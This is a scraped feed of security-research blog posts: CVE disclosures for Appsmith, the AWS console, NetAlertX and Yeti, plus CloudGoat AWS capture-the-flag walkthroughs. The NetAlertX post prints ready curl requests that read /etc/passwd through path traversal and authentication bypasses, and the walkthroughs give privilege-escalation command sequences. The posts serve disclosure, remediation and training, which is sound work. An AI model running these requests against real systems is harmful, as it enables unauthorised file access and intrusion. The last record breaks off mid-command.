resulting in a Denial-of-Service (DoS) attack, which prevents legitimate users from accessing the application.\nTo mitigate an active attack on an Appsmith Server, an administrator would need to delete the user account responsible for the restart requests. Currently, Appsmith does not provide administrators with the ability to revoke user sessions or force password changes.\nProof of Concept\nA detailed proof-of-concept exploit, demonstrating how an attacker can repeatedly trigger the restart API endpoint, is available. The provided script includes usage instructions for testing and validation. To support detection efforts, Rhino has also developed a custom Nuclei template targeting key indicators of the vulnerability. This allows security teams to quickly scan Appsmith instances for vulnerable versions. The exploit and Nuclei template can be viewed in our CVE Github repository.\nRemediation and Conclusion\nWe appreciate Appsmith’s collaboration in addressing these vulnerabilities. All three issues identified by Rhino Security Labs have now been patched across recent versions of the platform:\nCVE-2024-55965 (Denial-of-Service via Restart): Patched in v1.48. PR #37227 added proper ACL checks to the restart endpoint, preventing non-admin users from abusing the server restart function.\nCVE-2024-55964 (Datasource IDOR): Patched in v1.49. PR #37308 introduced role-based access control to the /schema-preview endpoint, blocking unauthorized users from querying datasource schemas via ID brute force.\nCVE-2024-55963 (Unauthenticated RCE): Patched in v1.52. The fix, implemented in PR #37068, hardened the default pg_hba.conf and introduced password-based authentication for the internal PostgreSQL instance, preventing unauthenticated command execution.\nUsers running self-hosted Appsmith instances should upgrade to v1.52 or later to ensure full protection against these three vulnerabilities.\nTwitter: https://x.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/TUuH26G5\nResearcher/Author: https://x.com/un1tycyb3r", "timestamp": "2025-10-21T13:34:51.370939"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CVE-2025-0693:  AWS IAM User Enumeration", "url": "https://rhinosecuritylabs.com/research/unauthenticated-username-enumeration-in-aws/", "published": "Tue, 11 Feb 2025 15:03:00 +0000", "content": "Intro: Cloud Pentesting and the Shared Responsibility Model\nUsername enumeration vulnerabilities can allow attackers to identify valid users, which is the first step in many attacks. During a recent pentest, we discovered two username enumeration vulnerabilities in the AWS Web Console. These vulnerabilities are interesting as they reside on AWS’s side of the Shared Responsibility Model. A majority of our testing and research focuses on the Customer’s side of the model or “Security in the Cloud”.\nThe two username enumeration findings we’ll detail here, result from bugs in Amazon’s credential verification software and put all console-enabled IAM users at risk of username enumeration.\nAs every AWS customer was affected by these risks, AWS worked closely with Rhino to get these addressed promptly.\nNote: While this article is a walkthrough of 2 findings related to username enumeration, only one has a CVE (Finding 2) and was acknowledged by AWS as a security flaw. Amazon noted that Finding 1 was an “Accepted Risk”.\nFinding 1 - Username Enumeration (Users w/ MFA)\nWhen MFA is enabled for an IAM user account, the login flow discloses the user’s existence. The flow diagram below shows the user experience of the login flow. After submitting credentials there is a fork that produces two completely different application states in the UI. This doesn’t require any special tools to detect.\nIf the user exists (regardless of whether the password is correct), the next page requests an MFA code (top image), confirming the IAM user in AWS.\nOtherwise, the application displays an error message that the user does not exist (bottom image).\nWhile this isn’t uncommon to see in web applications, its surprising to find in one of the major cloud providers.\nFinding 2 (CVE-2025-0693) - Username Enumeration via Timing Attack (no MFA)\nFinding 1 relies on the target IAM user having MFA enabled, which is an optional security feature – not all users use MFA. For those that don’t, the login flow is slightly different, and contains no obvious enumeration flaws.\nHowever, when looking closely at the traffic with a web proxy (Burp Suite), we noticed an interesting behavior that we could leverage for user enumeration. The login flow for this case is pictured below –\nWhen a single-factor (non-MFA) user submits credentials, there are two possible responses: “Error” and “Logged In”. Simulating an attacker, we don’t have the user’s password yet, so let’s look at the paths to Error.\nGenerally, login flows must validate both the username and password. If the user exists, the password gets checked. This check takes time and may result in a slower response from the server. If the timing difference is measurable it can be used for username enumeration.\nTo check for a timing difference, we created a test IAM user in our AWS account with the username “bfme-console”. The user was granted console access and MFA was disabled. We then used Burp Suite’s Intruder with no concurrency (Resource Pool > Maximum Concurrent Requests “1”). Below is an image of the Intruder results. The columns in the screenshot are:\n- Request: The request’s index. Sorting by this column will organize the list chronologically.\n- Payload: The payload used in the request. In this case, the payload is a username.\n- Status code: The HTTP status code received from the server.\n- Response received: The number of milliseconds it took for the server to respond. This is the key column here, as it is the closest representation of how long the server took to reply.\nLooking at the results in chronological order, we see a ~100ms increase in response time for the known test user. The timing difference is too small for humans to notice, but by measuring the precise response time, we can infer the logical path taken for the given user.\nPreventing Authentication Timing Attacks\nThe key to preventing these types of enumeration attacks is to ensure the server behaves the same when the username is valid or invalid. The likely cause of the timing difference is something known as a “quick exit” – a logical shortcut in the code often taken for efficiency’s sake. The OWASP Authentication Cheat Sheet describes this well and provides a pseudo-code comparison of a vulnerable and secure implementation of authentication failure.\nThe first code block below is insecure, containing a bug similar to the one disclosed here. Notice that the code jumps to the ELSE block if the user does not exist, displaying an error with much less processing (and time).\nIF USER_EXISTS(username) THEN password_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF ELSE RETURN Error(\"Invalid Username or Password!\") ENDIF\nThis next code block (also from the Authentication Cheat Sheet) shows us how to avoid the timing difference by ensuring both cases take the same amount of processing, and thus a similar amount of time.\npassword_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF\nLogging / Detection of CVE-2025-0693\nBoth attacks disclosed here generate “ConsoleLogin” events in CloudTrail, one with errorMessage “No username found in supplied account” and the other “Failed Authentication” (when username is valid but mfa or password is incorrect). Screenshots below provide the full Cloudtrail Log for each (Left: invalid IAM usernames, Right: valid usernames w/ failed authentication).\nLarge numbers of these two CloudTrail events (particularly from a range of IPs, or over a long period) may indicate your organization had been targeted using one – or both – of these techniques.\nConclusion\nIn this blog post, we covered two username enumeration flaws on the AWS Console Login page (including CVE-2025-0693).\nWe also discussed how one finding2 (CVE-2025-0693) was patched, but finding 1 was considered an “accepted risk”. Potential remediations for this issue was provided, and specifically what to look for in CloudTrail logs.\nWe’d like to extend a big “thank you” to the AWS Security team for their timely replies and for working with us to get this issue patched for all AWS customers.\nVulnerability Disclosure Timeline", "timestamp": "2025-10-21T13:34:52.238421"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CVE-2024-46506: Unauthenticated RCE in NetAlertx", "url": "https://rhinosecuritylabs.com/research/cve-2024-46506-rce-in-netalertx/", "published": "Thu, 30 Jan 2025 13:00:00 +0000", "content": "Background\nAffected Product Summary\nNetAlertX is an open-source Wi-Fi / Local Area Network (LAN) intruder detector that scans for devices connected to your network and alerts you if new and unknown devices are found.\nAs stated on their website, it offers “a user-friendly solution to monitor your (home or business) network, ensuring peace of mind and enhanced security”.\nWith more than 3k stars on the repo and 1.4 million pulls from Dockerhub, it is a popular tool for protecting SOHO network environments.\nVendor: https://netalertx.com/\nProduct: NetAlertX\nConfirmed Vulnerable Version:\n- Command Injection: v23.01.14 – v24.9.12\n- Arbitrary file read: v24.7.18 -v24.9.12\nFixed Version: v24.10.12\nProduct Link: https://github.com/jokob-sk/NetAlertX\nNetAlertX as a LAN Intrusion Detection Tool\nThe NetAlertX web component is developed in a combination of PHP and Python and can be deployed in a docker container. At the time of writing this blog there were 15 public instances identified online (one of which was identified belonging to a public research university). This was surprising to us, as we expected that most of these applications would only be accessible from the LAN rather than the internet. For deployments with internet facing access, compromising these would allow an attacker to pivot to the LAN. Furthermore, by compromising a server that is responsible for detecting intruders, attackers could fly under the radar while attacking the LAN.\nIn this blog post, I will be discussing an unauthenticated command injection vulnerability that was discovered during a security audit of the codebase.\nThe proof-of-concept exploit can be found in our CVE Github repository: https://github.com/RhinoSecurityLabs/CVE-Private/blob/master/CVE-2024-46506\nRemediation\nThe initial patch commit for this CVE can be found in this commit on the NetAlertX repository. After the initial patch was released, there were 2 bypasses discovered which we communicated with the NetAlertX team. You can find the patch bypass fix here.\nCVE-2024-46506: Unauthenticated command injection via settings update\nNetAlertX supports plugins, which are for tasks such as scanning the network, sending an IM notification, or doing a database backup. The administrative interface provides a webpage to modify these settings:\nAs shown in the above image, there is a box for a command to be executed on the server (which may be susceptible to command injection) but it is grayed out. However, it was discovered that there were no actual controls on the backend to prevent someone from updating this value. More concerningly, the backend does not verify authentication on this request.\nLooking at the code for this, the graphical interface for the panel, /settings.php implements authorization checks with a checkPermissions() call.\nBut the /settings.php file isn’t actually responsible for updating the settings, it only contains the javascript to make the request to another PHP file which updates the NetAlertX settings on the backend.\nThe image above shows that util.php is called from the settings.php script. util.php doesn’t perform authentication checks like settings.php did. This means checkPermissions() is never called and you can update settings by directly requesting util.php.\nAs shown in the image above, there are no authentication checks between the beginning of the file and where saveSettings() is called. If we send a POST request with the data “function=savesettings”, we can successfully call this function with no authentication. The saveSettings() function will update the plugin command and automatically reload the application, which involves executing each plugin that is set to execute on initialization. This results in RCE!\nCVE-2024-48766: Unauthenticated Arbitrary File Read\nA similar issue was also identified with the logs.php endpoint. Attackers could request a log file and read sensitive files due to no authentication being required and a path traversal vulnerability:\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php -d 'items=[{\"buttons\":[{\"labelStringCode\":\"Maint_PurgeLog\",\"event\":\"logManage('app.log', 'cleanLog')\"},{\"labelStringCode\":\"Maint_RestartServer\",\"event\":\"askRestartBackend()\"}],\"fileName\":\"passwd\",\"filePath\":\"/app/front/../../../../../../etc/passwd\",\"textAreaCssClass\":\"logs\"}]'\nThe image above shows the content retrieval of an unsanitized filepath, which is eventually added to the HTML.\nThe initial patch commit bypasses\nUpon the patch being committed we decided to review it for any potential bypasses/vulnerabilities. Authentication checks were implemented by performing a require_once() call against a security.php file.\nWe must now take a closer look at security.php. If we can get past this require_once() call, we can continue to exploit any vulnerable functionality within the application.\nBypass 1: Execute After Redirect (EAR) leads to authentication bypass\nAt the bottom of the security.php file, various checks will be performed to determine whether to allow a request to continue or block them. However, simply serving a “Location” header to the client is insufficient to actually block a request, as a HTTP client can simply ignore the redirect.\nTo exploit this bypass, we don’t need to change the original curl command for the LFI vulnerability. To fix this, the application will need to call “exit;” after sending the Location header to the client.\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php -d 'items=[{\"buttons\":[{\"labelStringCode\":\"Maint_PurgeLog\",\"event\":\"logManage('app.log', 'cleanLog')\"},{\"labelStringCode\":\"Maint_RestartServer\",\"event\":\"askRestartBackend()\"}],\"fileName\":\"passwd\",\"filePath\":\"/app/front/../../../../../../etc/passwd\",\"textAreaCssClass\":\"logs\"}]'\nBypass 2: Insecure usage of strpos() leads to authentication bypass\nsecurity.php will allow the client to continue if they are properly authenticated OR if they are trying to login (as blocking unauthenticated requests for login would prevent legitimate users from logging in). security.php will check if the client is requesting the login page by using the strpos() function.\nWe can see in the 3rd if statement that the request will allowed to continue if 1 of 3 conditions is true:\n- The session variable “login” is set to true (we have no control over this)\n- isLogonPage is set to true (can we control this?)\n- If we have a cookie named “NetAlertX_SaveLogin” set and the value is equal to the hash of the admin password (we would need to know the admin’s password for this)\nThe vulnerability arises due to the fact that we can control the value of isLogonPage by abusing the behavior of the strpos() call. Since strpos() is position independent and is called against the entire URL including parameters, we can simply add a parameter to the end of the URL and set isLogonPage to be true (despite not requesting the login page, allowing us to bypass the authentication checks).\ncurl -X POST http://192.168.1.33:20211/php/components/logs.php?bypass=index.php -d 'items=[{\"buttons\":[{\"labelStringCode\":\"Maint_PurgeLog\",\"event\":\"logManage('app.log', 'cleanLog')\"}, {\"labelStringCode\":\"Maint_RestartServer\",\"event\":\"askRestartBackend()\"}],\"fileName\":\"passwd\",\"filePath\":\"/app/front/../../../../../../etc/passwd\",\"textAreaCssClass\":\"logs\"}]'\nThe maintainers took our concerns into account and made another commit which fixed the aforementioned issues. The new version of NetAlertX was then released with both patches.\nConclusion\nWe found CVE-2024-46506 while auditing the codebase of NetAlertX due to its interesting position within a LAN. We leveraged an unauthenticated command injection vulnerability to achieve RCE on the application server and gain access to the LAN. We reviewed the initial patch and communicated additional bypasses with the NetAlertX team which were quickly fixed. We want to thank NetAlertX for working with us to remediate this vulnerability.\nWe have added a proof-of-concept to our CVE Github repository that demonstrates this vulnerability. As always, feel free to follow us on Twitter or LinkedIn and join our Discord server for more releases and blog posts.\nTwitter: https://twitter.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/TUuH26G5\nResearcher/Author: https://x.com/_chebuya", "timestamp": "2025-10-21T13:34:53.121140"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CVE-2024-46507: Yeti Platform  Server-Side Template Injection (SSTI)", "url": "https://rhinosecuritylabs.com/research/cve-2024-46507-yeti-server-side-template-injection-ssti/", "published": "Wed, 29 Jan 2025 13:01:00 +0000", "content": "Vulnerability Overview\nAffected Product Summary\nYeti is a Forensic Intelligence platform and pipeline for DFIR teams. It allows threat intelligence and DFIR teams to catalog, search, and link pieces of intelligence such as IP addresses, TTPs, and threat actors. With 10,000 pulls from Dockerhub and nearly 2,000 stars on GitHub, it is a fairly popular tool for DFIR practitioners.\nIn this blog post, I will detail 2 security flaws that, if used in conjunction, could lead to unauthenticated remote code execution on the application server. The consequences of a successful server compromise could include attackers collecting intelligence on who/what the threat intel teams were monitoring and modifying/destroying IoCs/observables.\nThe proof-of-concept exploit can be found in our CVE Github repository.\nThe patch for these CVEs can be found on the yeti-platform repository: SSTI, Insecure secret\nVendor: https://yeti-platform.io/\nProduct: YETI (Your Everyday Threat Intelligence)\nConfirmed Vulnerable Version:\nFixed Version: 2.1.12\nProduct Link: https://github.com/yeti-platform/yeti\nCVE-2024-46507: SSTI Leads to RCE\nYeti allows its users to create custom report templates that users can export their IoCs/intel into a custom format. The template content is not sanitized before being processed on the backend, leading to the possibility of code execution.\nTemplates can be used to export observables (hashes, domains, IP addresses). To successfully instantiate an export, there needs to be an observable too export. To create one, can go to Observables -> New Observable -> Save\nTo trigger the rendering of our malicious template, we need to select our newly created observable to export it with our malicious template.\nAfter exporting the observables, a .txt file is downloaded.\nIn the .txt file, we see the output of the command that we chose in the malicious template (in this case, id).\nCVE-2024-46508: Use of Static Insecure Secret\nYeti makes use of JWTs for authentication. The application is most commonly deployed using a docker-compose file. I was surprised during the installation process, there is no need to ever actually open the .env file to change anything, it was as simple as cloning the repo, running docker-compose, and the application was up in a few seconds. Furthermore, the documentation does not refer to the .env file anywhere. Concerningly, in the .env file the JWT secret was configured as “SECRET” and did not seem to be replaced at runtime. Given the fact that the .env file is not required to be modified in the installation process or mentioned in documentation, there was a good chance that instances deployed in the wild would have not changed the static secret. Furthermore, the variable naming did not make it readily apparent that it was being used for a JWT secret.\nWith a known JWT secret, attackers can generate valid tokens and bypass authentication. Combined with the ability to execute commands from an authenticated context, this was more concerning.\nConclusion\nWe found Yeti interesting as the primary users would be blue teams. While reviewing the codebase, we discovered CVE-2024-46507 allowing authenticated users to execute code on the application server. While looking for other ways to exploit this vulnerability besides brute forcing/obtaining valid credentials for the application, we discovered a static JWT secret being used in the docker deployment process (CVE-2024-46508). Combining both of these issues, it would be possible to obtain unauthenticated code execution on applications in the default configuration. We want to thank the Yeti team for working with us to remediate this vulnerability.\nWe have added a proof-of-concept to our CVE Github repository that demonstrates this vulnerability. As always, feel free to follow us on Twitter or LinkedIn and join our Discord server for more releases and blog posts.\nTwitter: https://twitter.com/rhinosecurity\nLinkedIn: https://www.linkedin.com/company/rhino-security-labs/\nDiscord: https://discord.gg/TUuH26G5\nResearcher/Author: https://x.com/_chebuya", "timestamp": "2025-10-21T13:34:54.007471"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CloudGoat Official Walkthrough Series: ‘sqs_flag_shop’", "url": "https://rhinosecuritylabs.com/research/cloudgoat-walkthrough-sqs_flag_shop/", "published": "Tue, 03 Dec 2024 14:05:00 +0000", "content": "Introduction to CloudGoat\nCloudGoat is Rhino Security Labs’s tool for deploying “vulnerable by design” AWS infrastructure. This blog post will walk through one of the newest CloudGoat scenarios, sqs_flag_shop. where you will attempt to move through an AWS environment and perform privilege escalation against the Glue service in order to capture the flag.\nThere are few pains in life like waiting in a queue. That’s why there are whole industries dedicated to using software that will help ease that pain point (for example; ordering ahead). Don’t you wish you could get revenge against all the lost time you’ve spent waiting in queues?\nWell now you can.\nThe ‘sqs_flag_shop’ is a Cloudgoat Scenario created by BoB12-C-G-V (https://github.com/BoB12-C-G-V). Rhino would like to take this opportunity to thank BoB12-C-G-V’s members for this scenario and contributing to open-source software.\nSpoiler Warning: This post contains a complete walkthrough of the SQS Flag Shop CloudGoat scenario. If you intend to go through this yourself and don’t want hints, stop here and come back when you’re done.\nThis image shows the path which you will take to capture the flag in the scenario.\nStart of Scenario\nUse the following command to start the CloudGoat scenario:\n$ python cloudgoat.py create sqs_flag_shop\nOnce the terraform process is complete, the starting data for the scenario will be provided. This is what the output will look like:\n[cloudgoat] terraform output completed with no error code. cg_web_site_ip = 34.XXX.XXX.XXX:XXXX cloudgoat_output_sqsuser_access_key_id = AKIXXXXXXXXXXXXXXXXX cloudgoat_output_sqsuser_secret_key = isbXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\nThe scenario provides a set of AWS credentials. Let’s create an AWS profile on the command line:\n$ aws configure --profile sqs_user AWS Access Key ID [******************QP]: AWS Secret Access Key [******************2U]: Default region name [us-east-1]: Default output format [json]:\nAfter setting up the profile for an AWS account, the first command to run is the AWS equivalent to ‘whoami’ so we can understand more about our user. (new: The ‘sts get-caller-identity command returns details about the IAM user or role whose credentials are used to call the operation.)\n$ aws --profile sqs_user sts get-caller-identity { \"UserId\": \"XXXXXXXXXXXXXXXXXXZF4\", \"Account\": \"XXXXXXXXXXXX\", \"Arn\": \"arn:aws:iam::XXXXXXXX:user/cg-sqs-user-sqs_flag_shop_cgidbXXXXXXXXX\" }\nThis returns a JSON object containing three pieces of information:\n- UserId\n- Account\n- Arn\nVisit the Amazon Web Services (AWS) documentation for more information about Amazon Resource Names (ARNs)\nEnumerate User Policies\nIn AWS, a policy is an object that, when associated with an identity or resource, defines their permissions. Let’s see what policies are associated with our user:\n$ aws \\ --profile sqs_user \\ iam list-user-policies \\ --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXX { \"PolicyNames\": [ \"cg-sqs-scenario-assumed-role-policy\" ] }\nThis shows us that the user has one attached policy. Let’s look at the contents of the policy:\n$ aws \\ --profile sqs_user \\ iam get-user-policy \\ --user-name cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX \\ --policy-name cg-sqs-scenario-assumed-role-policy { \"UserName\": \"cg-sqs-user-sqs_flag_shop_cgidXXXXXXXXXX\", \"PolicyName\": \"cg-sqs-scenario-assumed-role-policy\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"iam:Get*\", \"iam:List*\" ], \"Effect\": \"Allow\", \"Resource\": \"*\", \"Sid\": \"VisualEditor0\" }, { \"Action\": \"sts:AssumeRole\", \"Effect\": \"Allow\", \"Resource\": \"arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role\", \"Sid\": \"VisualEditor1\" } ] } }\nThis policy says that we can assume a role! Let’s see the policies attached to the role:\n$ aws \\ --profile sqs_user \\ iam list-role-policies \\ --role-name cg-sqs_send_msg_role { \"PolicyNames\": [ \"cg-sqs_scenario_policy\" ] }\nThe role we can assume (cg-sqs_send_msg_role) has an attached policy (cg-sqs_scenario_policy). Let’s take a look at the contents of this policy now:\n$ aws \\ --profile sqs_user \\ iam get-role-policy \\ --role-name cg-sqs_send_msg_role \\ --policy-name cg-sqs_scenario_policy { \"RoleName\": \"cg-sqs_send_msg_role\", \"PolicyName\": \"cg-sqs_scenario_policy\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"sqs:GetQueueUrl\", \"sqs:SendMessage\" ], \"Effect\": \"Allow\", \"Resource\": \"arn:aws:sqs:us-east-1:XXXXXXXXXXXX:cash_charging_queue\", \"Sid\": \"VisualEditor0\" } ] } }\nAssume New SQS Role\nWow, lucky day. We now have the ability to send a SQS message to the cash charging queue.\nLet’s assume the role that can send a message:\n$ aws \\ --profile sqs_user \\ sts assume-role \\ --role-arn arn:aws:iam::XXXXXXXXXXXX:role/cg-sqs_send_msg_role \\ --role-session-name sqs_send_role { \"Credentials\": { \"AccessKeyId\": \"XXXXXXXXXXXXXXXXLOT5\", \"SecretAccessKey\": \"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXQPgU\", \"SessionToken\": \"XXX...XXX\" , \"Expiration\": \"2024-02-08T23:29:43+00:00\" }, \"AssumedRoleUser\": { \"AssumedRoleId\": \"XXXXXXXXXXXXXXXXXX2GJ:sqs_send_role\", \"Arn\": \"arn:aws:sts::XXXXXXXXXXXX:assumed-role/cg-sqs_send_msg_role/sqs_send_role\" } }\nLet’s configure an AWS profile with this assumed role:\n[sqs_send_role] aws_access_key_id = ASIAXXXXXXXXXXXXXXXX aws_secret_access_key = WmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX aws_session_token = IQoXXXXXXXX...\nLet’s get the URL of the SQS queue we now have access to:\n$ aws \\\n–profile sqs_send_role \\\nsqs get-queue-url \\\n–queue-name cash_charging_queue\n{\n“QueueUrl”: “https://sqs.us-east-1.amazonaws.com/XXXXXXXX/cash_charging_queue”\n}\nGreat! We have the URL. All we need to do now is determine the structure of the SQS message.\nAnalysis of Web Application\nIn order to do that, let’s visit the “cg_web_site_ip” IP address provided at the beginning of the scenario.\nWhen we visit the ‘cg_web_site_ip’ in a browser, a shopping website will be displayed:\nLet’s analyze the network connections generated by the website during normal use. Open the browser’s developer tools and order a banana:\nWe can see that ordering a banana is a HTTP POST request.\nLet’s continue by inspecting the source code of the website for clues.\nIn the website’s HTML source code’s body tag, we can see a HTML comment. It contains the source code of the backend! After exploring the code, we found a function that controls the charge_cash functionality. This represents an endpoint that accepts a HTTP POST request.\nIn the code we can see the format of the message! It’s a JSON object with one key-value pair. The key is ‘charge_amount’. The value is the amount of cash that will be deposited into the account. With this information, we can finally send our own SQS message via the command line.\nSkipping the Line (Sending a SQS Message)\n$ aws \\ --profile sqs_send_role \\ sqs send-message \\ --queue-url https://sqs.us-east-1.amazonaws.com/XXXXXXX/cash_charging_queue \\ --message-body '{\"charge_amount\": 100000000}' { \"MD5OfMessageBody\": \"a539XXXXXXXXXXXXXXXXXXXXXXXXXXXX\", \"MessageId\": \"67dcXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX\" }\nIf we refresh the web application, we can see our new balance:\nWith this new balance, we can order the flag and check the receipt for the flag:\nConclusion\nIn this SQS Flag Shop CloudGoat scenario, we started by enumerating the user permissions. Then, we assumed a new role with new permissions. In addition, with the help of reconnaissance of the web application, the discovery of the underlying source code was found. With our new permissions and new understanding of the web application, we crafted a new AWS SQS message in order to gain more money and buy the flag.\nIf all went well, this CloudGoat scenario provided some experience into AWS penetration testing. If you want to contribute to CloudGoat, feel free to open issues and pull requests on GitHub, and follow us on Twitter @RhinoSecurity for updates.\nAnd we’re done! Now, go celebrate by not waiting in line!", "timestamp": "2025-10-21T13:34:54.888653"}
{"source": "blog", "feed": "https://rhinosecuritylabs.com/feed/", "title": "CloudGoat: New Scenario and Walkthrough (sns_secrets)", "url": "https://rhinosecuritylabs.com/research/cloudgoat-sns_secrets/", "published": "Tue, 15 Oct 2024 13:00:00 +0000", "content": "Introduction: CloudGoat and SNS\nThis is a full walkthrough for the new sns_secrets scenario on CloudGoat.\nCloudGoat allows people to hone their cloud security skills by completing several “capture-the-flag” challenges. Full set-up instructions are on the CloudGoat Github.\nAmazon Simple Notification Service (SNS) is a managed messaging service that sends notifications to subscribers using various methods like email, SMS, and HTTP. It’s used for alerting, sending updates, and integrating different notification systems. Misconfigurations can cause unauthorized users sending spam from the victim’s environment, sending fake alerts, or accessing sensitive information (which we’ll demonstrate in this scenario).\nThis scenario also uses API Gateway, an AWS service for creating and monitoring APIs. More introductory info can be found here.\n‘SNS_Secrets’ Scenario Overview\nIn this Cloudgoat Scenario, you start with an Access Key ID and Secret Access Key. Your task is to enumerate IAM permissions and discover SNS Topics. SNS enumeration can be done manually with the AWS CLI, or using the new Pacu modules (“sns__enum” / “sns__subscribe”).\nAfter subscribing to SNS topics and confirming your email, you will receive an API Key as a debug message. You can use the key to authenticate to the API Gateway and retrieve the final flag.\nThe objective of this beginner-friendly scenario is to help you understand the following:\n- Configuring Access Keys in the AWS CLI.\n- Performing basic IAM role enumeration.\n- Using Pacu to discover SNS Topics.\n- Identifying API Gateways with the AWS CLI.\nConfiguring Access Keys in the AWS CLI\nAfter launching the scenario, you are provided with an Access Key ID and Secret Access Key for an IAM role. These allow you to interact with the AWS account programmatically via the CLI (Command Line Interface). You can create an IAM profile with this command:\naws configure –profile sns-secrets\nYou are prompted for the Access Key ID, Secret, and Region. Below is an example (your keys will be different):\nAWS Access Key ID: AKIA2GIZ2CSU6NWNVATNA AWS Secret Access Key: SYpZBG++MXkmdvmUL614A4XAAs84hacansh3 Default region name: us-east-1 Default output format [None]:\nFinally, you can confirm access by running get-caller-identity (the AWS equivalent of “whoami”):\naws sts get-caller-identity –profile sns-secrets\n1 - Performing Basic IAM Role Enumeration\nOne of the first steps in an AWS Penetration Test is to enumerate permissions. Enumeration helps determine the exact level of access within the AWS account, which we’ll demonstrate with the AWS CLI and Pacu. This includes identifying which actions we can perform and on which resources.\nThe instructions explained below demonstrate using either the AWS CLI or Pacu so you can compare the two as you go. You do not need to perform both sections.\nEnumeration using the AWS CLI\nNow that we have access to an IAM user, we need to identify our permissions. This will identify policies connected to the current IAM user:\naws iam list-user-policies –user-name [UserName] –profile sns-secrets\nThe command above will provide the policy name for the account. We need to use this policy name for the next command:\naws iam get-user-policy --user-name [UserName] --policy-name [PolicyName] --profile sns-secrets\nThe output of this command gives us the full policy JSON, which we can see provides our user permissions related to SNS, IAM, and API Gateway.\n{ \"UserName\": \"cg-sns-user-sns_secrets_cgidlhjrmdp38t\", \"PolicyName\": \"cg-sns-user-policy-sns_secrets_cgidlhjrmdp38t\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Action\": [ \"sns:Subscribe\", \"sns:Receive\", \"sns:ListSubscriptionsByTopic\", \"sns:ListTopics\", \"sns:GetTopicAttributes\", \"iam:ListGroupsForUser\", \"iam:ListUserPolicies\", \"iam:GetUserPolicy\", \"iam:ListAttachedUserPolicies\", \"apigateway:GET\" ], \"Effect\": \"Allow\", \"Resource\": \"*\" }, { \"Action\": \"apigateway:GET\", \"Effect\": \"Deny\", \"Resource\": [ \"arn:aws:apigateway:us-east-1::/apikeys\", \"arn:aws:apigateway:us-east-1::/apikeys/*\", \"arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/GET\", \"arn:aws:apigateway:us-east-1::/restapis/*/methods/GET\", \"arn:aws:apigateway:us-east-1::/restapis/*/resources/*/integration\", \"arn:aws:apigateway:us-east-1::/restapis/*/integration\", \"arn:aws:apigateway:us-east-1::/restapis/*/resources/*/methods/*/integration\" ] } ] } }\nEnumeration using Pacu\nInstead of using the AWS CLI, we can also enumerate our IAM permissions with Pacu, Rhino’s open-source AWS exploitation framework. This provides the same information as the previous section, but demonstrates Pacu’s efficiency.\nNote: We’ll assume you’re familiar with Pacu, but if that’s new to you, check out the official Pacu documentation here.\nPacu (pacu-dev:No Keys Set) > import_keys sns-secrets\nNow you can run the iam__enum_permissions module. This will attempt to use IAM APIs to enumerate a confirmed list of permissions. By default, the owner of the active set of keys is targeted. This is done by checking attached and inline policies for the user and groups they are in.\nPacu (pacu-dev:imported-sns-secrets) > run iam__enum_permissions\nFinally, you can run ‘whoami’ from within Pacu to get a list of the confirmed permissions.\nPacu (pacu-dev:imported-sns-secrets) > whoami\nThis provides the same information as manually doing it via the AWS CLI but showcases the efficiency of using Pacu.\n2 - Discover SNS Topics using Pacu\nSubscribing to an SNS Topic\nPacu can be used to enumerate SNS Topics. There are two modules for interacting with SNS – one for listing the SNS topics available, and the other to subscribe to a given topic. You can find these by searching within Pacu:\nPacu (sns-secrets:imported-sns-secrets) > search sns [Category: ENUM] List and describe Simple Notification Service topics sns__enum [Category: LATERAL_MOVE] Subscribe to a Simple Notification Service (SNS) topic sns__subscribe\nLet’s begin with the sns__enum module. We can get more information with this command:\nPacu (sns-secrets:imported-sns-secrets) > help sns__enum\nThis module lists and gathers information from SNS Topics. Let’s run it and see if it identifies an SNS Topic we can access.\nPacu (sns-secrets:imported-sns-secrets) > run sns__enum --region us-east-1\nWe can view the Topic’s ARN by typing “data” to access the Pacu database for our session.\nPacu (sns-secrets:imported-sns-secrets) > data\nNow that we have the full ARN, let’s check the sns__subscribe module.\nPacu (sns-secrets:imported-sns-secrets) > help sns__subscribe\nThis module subscribes to a topic based on the ARN, sending the data to our (attacker controller) email address so we can confirm the subscription.\nPacu (sns-secrets:imported-sns-secrets) > run sns__subscribe --topics [TopicARN] --email [Email]\nThis image shows the confirmation email sent by AWS.\nAfter confirming the SNS Topic subscription, you will receive a message that leaks an API Key for the API Gateway (one of the key ‘flags’ for the Scenario). This notification is sent every five minutes, so you may need to wait for the message.\nThis image shows the API Gateway Key sent as a notification from SNS.\n3 - Identifying API Gateways using the CLI\nAccessing the API Gateway\nNow that we have an API Key for the API Gateway, we need to identify the full URL. First, let’s retrieve basic information (such as the Gateway ID) on the target API:\naws apigateway get-rest-apis --profile sns-secrets --region us-east-1\nUsing this ID we can get the Gateway stages and resources (shown in the next 2 CLI commands). The Stage Name and Resource path (in addition to our previous API ID) are needed for retrieving the full URL of the API Gateway.\naws apigateway get-stages --rest-api-id [API ID] --profile sns-secrets --region us-east-1 aws apigateway 